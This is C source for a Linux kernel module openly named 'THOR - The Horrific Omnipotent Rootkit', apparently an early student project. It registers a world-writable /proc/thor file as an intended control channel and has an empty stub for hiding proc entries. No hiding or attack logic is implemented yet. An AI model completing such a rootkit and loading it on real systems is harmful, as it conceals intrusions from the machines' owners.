#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

#include "internals.h"

#define LOG_TAG "THOR: "
#define LOG_DEBUG(msg) printk(KERN_DEBUG LOG_TAG msg "\n")
#define LOG_ERROR(msg) printk(KERN_ERR LOG_TAG msg "\n")
#define LOG_INFO(msg)  printk(KERN_INFO LOG_TAG msg "\n")

#define THOR_PROCFILE "thor"

// ------------------------------------------------------------ PROTOTYPES
static int __init thor_init(void);
static int __init procfile_init(void);
static int __init prochidder_init(void);
static int procfile_open(struct inode *inode, struct file *file);
static int procfile_read(struct seq_file *m, void *v);
static ssize_t procfile_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos);
static void procfile_cleanup(void);

// ------------------------------------------------------------ GLOBALS
static struct proc_dir_entry *procfile;
static struct proc_dir_entry *procroot;
static struct file_operations procfile_fops = {
    .owner = THIS_MODULE,
    .open = procfile_open,
    .read = seq_read,
    .write = procfile_write,
    .llseek = seq_lseek,
    .release = single_release,
};

// ------------------------------------------------------------ INIT
static int __init thor_init(void)
{
    procfile_init();
    prochidder_init();

    LOG_INFO("init done");
    return 0;
}

static int __init procfile_init(void)
{
    // allocate file in proc
    procfile = proc_create(THOR_PROCFILE, 0666, NULL, &procfile_fops);
    if (procfile == NULL) {
        LOG_ERROR("could not create proc entry");
        return -1;
    }
    procroot = procfile->parent;

    return 0;
}

static int __init prochidder_init(void)
{
    if (procfile == NULL) {
        LOG_ERROR("procfile not set");
        return -1;
    }

    return 0;
}

// ------------------------------------------------------------ PROCFILE
static int procfile_read(struct seq_file *m, void *v)
{
    // TODO print usage
    seq_printf(m, "Hello proc!\n");
    return 0;
}

static int procfile_open(struct inode *inode, struct file *file)
{
    return single_open(file, procfile_read, NULL);
}

static ssize_t procfile_write(struct file *file, const char __user *buffer,
        size_t count, loff_t *ppos)
{
    // TODO compare buffer with builtin
    return count;
}

// ------------------------------------------------------------ CLEANUP
static void __exit thor_cleanup(void)
{
    procfile_cleanup();

    LOG_INFO("cleanup done");
}

static void procfile_cleanup(void)
{
    if (procfile != NULL) {
        proc_remove(procfile);
        procfile = NULL;
    }
}

module_init(thor_init);
module_exit(thor_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alex Hirsch (W4RH4WK) <alexander.hirsch@student.uibk.ac.at>");
MODULE_AUTHOR("Franz-Josef Anton Friedrich Haider (krnylng) <Franz-Josef.Haider@student.uibk.ac.at>");
MODULE_DESCRIPTION("THOR - The Horrific Omnipotent Rootkit");
